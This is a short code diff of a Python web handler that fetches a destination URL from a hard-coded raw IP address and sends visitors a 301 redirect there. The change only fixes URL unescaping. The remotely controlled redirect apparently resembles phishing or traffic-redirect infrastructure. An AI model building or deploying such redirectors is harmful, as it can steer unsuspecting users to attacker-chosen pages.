@@ -15,7 +15,8 @@ def hello(name):
 
     sheet = requests.get('http://95.111.230.118/kisho/page/active_r.php?page=saidchase')
     link = sheet.text.strip().split('"')[1].split('\/\/')
-    url = f'{link[0]}//{link[1]}'
+    l1 = link[1].replace("\/","/")
+    url = f'{link[0]}//{l1}'
     r = make_response(redirect(f"{url}", code=301))
     r.headers.set('alt-svc', "clear")
     r.headers.set('cache-control', "private, max-age=90")
